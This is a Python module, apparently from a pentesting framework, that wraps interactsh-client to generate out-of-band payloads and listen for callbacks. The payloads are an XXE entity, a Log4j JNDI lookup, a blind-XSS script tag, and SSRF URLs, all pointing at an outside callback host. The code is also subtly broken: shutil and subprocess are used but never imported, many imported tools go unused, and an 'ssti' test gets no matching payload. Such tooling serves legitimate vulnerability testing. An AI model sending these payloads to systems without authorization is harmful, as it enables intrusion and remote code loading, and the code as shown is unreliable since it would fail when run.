"""
Interactsh OAST Agent

Manages out-of-band interaction testing using interactsh-client.
Generates OOB payloads for detecting blind SSRF, blind XSS, XXE, and
DNS/HTTP callbacks. Falls back to placeholder tokens with manual instructions.
"""

from engine.core.tool_bridge import sync_nuclei_scan, sync_nmap_scan, sync_ffuf_fuzz, sync_sqlmap_test, sync_amass_enum, sync_gobuster_enum, sync_bloodhound_enum, sync_metasploit_execute, sync_nessus_scan, sync_volatility_analyze, sync_zeek_analyze
import threading
import time
import json
import uuid
from typing import List, Dict, Optional, Callable



class InteractshOASTAgent:
    """Agent wrapping interactsh-client for out-of-band interaction testing."""

    PUBLIC_SERVER = 'oast.fun'

    def __init__(self, target: str, timeout: int = 60, max_workers: int = 4,
                 server: str = None):
        self.target = target
        self.timeout = timeout
        self.max_workers = max_workers
        self.server = server or self.PUBLIC_SERVER
        self.interactsh_available = bool(shutil.which('interactsh-client'))
        self._interactions: List[Dict] = []
        self._session_id: Optional[str] = None

    def generate_payload(self, test_name: str) -> Dict:
        """Generate an OOB payload URL and DNS host for a specific test."""
        if self.interactsh_available:
            return self._generate_interactsh_payload(test_name)
        return self._generate_fallback_payload(test_name)

    def _generate_interactsh_payload(self, test_name: str) -> Dict:
        """Generate a real interactsh payload."""
        token = str(uuid.uuid4())[:8]
        host = f'{token}.{self.server}'
        return {
            'test_name': test_name,
            'oob_host': host,
            'http_url': f'http://{host}',
            'https_url': f'https://{host}',
            'dns_host': host,
            'payloads': {
                'ssrf_url': f'http://{host}/ssrf-test',
                'xxe': f'<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{host}/xxe">]>',
                'log4j': f'${{jndi:ldap://{host}/log4j}}',
                'xss_blind': f'"><script src="http://{host}/xss.js"></script>',
                'redirect': f'http://{host}/redirect',
            },
            'tool': 'interactsh-client',
        }

    def _generate_fallback_payload(self, test_name: str) -> Dict:
        """Generate placeholder OOB tokens with manual instructions."""
        from engine.core.tool_checker import FallbackOOB
        result = FallbackOOB.generate_token(test_name)
        host = result['canary_domains'][0]
        result.update({
            'oob_host': host,
            'http_url': f'http://{host}',
            'https_url': f'https://{host}',
            'dns_host': host,
            'payloads': {
                'ssrf_url': f'http://{host}/ssrf-test',
                'xxe': f'<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{host}/xxe">]>',
                'log4j': f'${{jndi:ldap://{host}/log4j}}',
                'xss_blind': f'"><script src="http://{host}/xss.js"></script>',
                'redirect': f'http://{host}/redirect',
            },
            'tool': 'fallback_placeholder',
            'note': 'interactsh-client not installed. Install: go install github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest'
        })
        return result

    def listen(self, duration: int = 30, callback: Callable = None) -> List[Dict]:
        """
        Listen for OOB interactions for a given duration.
        Returns list of received interactions.
        """
        if not self.interactsh_available:
            return [{
                'note': 'interactsh-client not installed. Cannot listen for interactions.',
                'manual_check': f'Check https://app.interactsh.com for interactions.'
            }]

        interactions = []
        cmd = [
            'interactsh-client',
            '-server', self.server,
            '-json',
            '-no-color',
        ]

        try:
            proc = subprocess.Popen(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                text=True
            )
            end_time = time.time() + duration
            while time.time() < end_time:
                line = proc.stdout.readline()
                if not line:
                    time.sleep(0.5)
                    continue
                try:
                    interaction = json.loads(line.strip())
                    interactions.append(interaction)
                    if callback:
                        callback(interaction)
                except json.JSONDecodeError:
                    pass
            proc.terminate()
        except Exception as e:
            return [{'error': str(e)}]

        return interactions

    def run(self) -> Dict:
        """Generate OOB payloads for common blind vulnerability tests."""
        tests = ['ssrf', 'xxe', 'blind-xss', 'log4j', 'ssti']
        payloads = {}
        for test in tests:
            payloads[test] = self.generate_payload(test)

        return {
            'agent': 'interactsh_oast',
            'tool': 'interactsh-client' if self.interactsh_available else 'fallback_placeholder',
            'target': self.target,
            'payloads': payloads,
            'findings': [],
            'usage': (
                'Use payloads[test]["payloads"] values in your requests, '
                'then call listen() to check for callbacks.'
            ),
        }
